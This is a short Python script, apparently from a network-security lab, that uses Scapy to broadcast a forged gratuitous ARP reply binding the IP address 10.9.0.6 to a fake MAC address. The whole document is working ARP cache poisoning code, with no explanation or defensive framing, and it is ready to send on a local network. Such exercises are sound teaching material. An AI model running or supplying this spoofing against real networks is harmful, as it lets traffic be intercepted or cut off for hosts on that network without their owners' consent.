#!/usr/bin/env python3
from scapy.all import *

B = "10.9.0.6"
Fake_MAC = "12:34:56:78:9A:BC"

E_layer = Ether()
E_layer.dst = "ff:ff:ff:ff:ff:ff"

A_layer = ARP()
A_layer.op = 2
A_layer.hwdst = "ff:ff:ff:ff:ff:ff"
A_layer.hwsrc = Fake_MAC
A_layer.psrc = B
A_layer.pdst = B

pkt = E_layer / A_layer

pkt.show()
sendp(pkt, verbose=True)
